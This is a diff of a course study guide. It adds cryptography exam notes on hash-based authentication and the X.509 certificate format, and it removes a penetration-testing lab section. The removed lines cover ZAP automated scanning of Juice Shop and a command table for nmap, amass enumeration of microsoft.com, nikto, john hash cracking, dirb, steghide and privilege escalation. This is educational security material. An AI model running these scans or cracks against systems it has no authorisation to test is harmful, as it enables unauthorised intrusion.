+**Method (c): Use a shared secret value S (no encryption)**
+- Sends: **M ‖ H(M ‖ S)**
+- Secret S never transmitted; provides **authentication only**.
+
+**Method (d): Encrypt [M ‖ H(M ‖ S)] for added confidentiality**
+- Sends: **E(K, [M ‖ H(M ‖ S)])**
+- Provides **authentication + confidentiality**.
+
+**Diagrams to draw:** For each method, draw Source A (left) and Destination B (right) with the message M, hash block H, encrypt/decrypt blocks E/D, and a "Compare" box at the receiver. Label the transmitted quantity in the middle:
+- (a) → E(K, [M ‖ H(M)])
+- (b) → M, E(K, H(M))
+- (c) → M, H(M ‖ S)
+- (d) → E(K, [M ‖ H(M ‖ S)])
+
 ---
 
-## Experiment 9: Full Web Application Penetration Test (OWASP ZAP)
+### Q. "Explain the X.509 certificate format with a neat diagram" (10 marks)
 
-### What is this?
-We use OWASP ZAP to automatically spider and scan OWASP Juice Shop for vulnerabilities like XSS, SQL injection, broken authentication, and insecure direct object references.
+See [Topic 6](#7-topic-6--x509-certificates) for the full field list, notation, and version logic.
 
----
+**Diagram — X.509 certificate format (draw the fields stacked top to bottom):**
 
-### Part A – Install OWASP ZAP
-
-**Option 1 – Via terminal (easiest)**
-```bash
-sudo apt update
-sudo apt install zaproxy -y
+```
++------------------------------------------+
+|              Version                     |  ┐
++------------------------------------------+  |
+|        Certificate serial number         |  |
++------------------------------------------+  |
+|      Signature algorithm identifier      |  |
++------------------------------------------+  | Version 1
+|              Issuer name                 |  |
++------------------------------------------+  |
+|           Period of validity             |  |
++------------------------------------------+  |
+|             Subject name                 |  |
++------------------------------------------+  |
+|        Subject's public-key info         |  ┘
++------------------------------------------+  ┐
+|         Issuer unique identifier         |  | Version 2
++------------------------------------------+  |
+|        Subject unique identifier         |  ┘
++------------------------------------------+  ┐
+|              Extensions                  |  | Version 3
++------------------------------------------+  ┘
+|              Signature                   |  (all versions)
++------------------------------------------+
 ```
 
-**Option 2 – Via installer download**
-- Go to `www.zaproxy.org` → Download → Select **Linux Installer**
-- Then in terminal:
-```bash
-cd Downloads
-ls
-chmod o+x ZAP_*.sh
-./ZAP_*.sh
-```
-Follow: Next → Install.
+- **Version 1:** Version through Subject's public-key info.
+- **Version 2:** Adds Issuer + Subject unique identifiers.
+- **Version 3:** Adds Extensions.
+- **Signature:** Present in all versions (hash of all fields, encrypted with the CA's private key).
 
 ---
 
-### Part B – Run Automated Scan
-
-**Step 1 – Launch ZAP**
-```bash
-zaproxy
-```
-Or: Kali Menu → Web Application Analysis → OWASP ZAP
-
-**Step 2 – Start a new session**
-When prompted to persist session → click **No**.
-
-**Step 3 – Close the welcome message box if it appears**
-
-**Step 4 – Go to Quick Start tab → Click "Automated Scan"**
-
-**Step 5 – Enter the target URL**
-```
-http://juice-shop.herokuapp.com
-```
-
-**Step 6 – Click "Attack"**
-ZAP will spider all pages and then actively scan for vulnerabilities.
-
-**Step 7 – Monitor progress**
-Watch the status bar at the bottom.
-
-**Step 8 – Review Alerts**
-Click the **Alerts** tab at the bottom.
-Double-click any alert to see:
-- Vulnerability description
-- Affected URL
-- Evidence
-- Recommended fix
-
----
-
-### Expected Result
-Multiple vulnerabilities detected (XSS, SQLi, missing headers, etc.) listed in the Alerts tab with severity and remediation.
-
----
-
----
-
-## Quick Reference – All Commands
-
-| Experiment | Command |
-|---|---|
-| 1 – Find your IP | `ip a` |
-| 1 – Ping scan | `nmap -sn 192.168.1.0/24` |
-| 1 – Detailed scan | `nmap -sS -sV -O <IP>` |
-| 1 – Aggressive scan | `nmap -A 192.168.1.0/24` |
-| 1 – Subdomain enum | `amass enum -d microsoft.com` |
-| 2 – Nikto scan | `nikto -h http://127.0.0.1/DVWA/` |
-| 3 – Network discover | `netdiscover` |
-| 3 – FTP login | `ftp <IP>` → user: anonymous |
-| 3 – Crack hash | `john sunset.txt` |
-| 3 – SSH login | `ssh sunset@<IP>` |
-| 4 – Start Apache | `service apache2 start` |
-| 4 – Start MySQL | `sudo systemctl start mysql` |
-| 4 – MySQL shell | `mysql` |
-| 6 – Crack MD5 | `john --format=raw-MD5 dvwa_password.txt` |
-| 6 – Show results | `john --format=raw-MD5 dvwa_password.txt --show` |
-| 8 – dirb scan | `dirb http://<IP>/ -X .txt` |
-| 8 – SCP copy | `scp user@<IP>:/path/* .` |
-| 8 – Steghide | `steghide extract -sf "image.jpeg"` |
-| 8 – Escalate | `sudo su` |
-| 9 – Launch ZAP | `zaproxy` |
+*End of Module 3 study guide — BCY602 Cryptography and Network Security.*
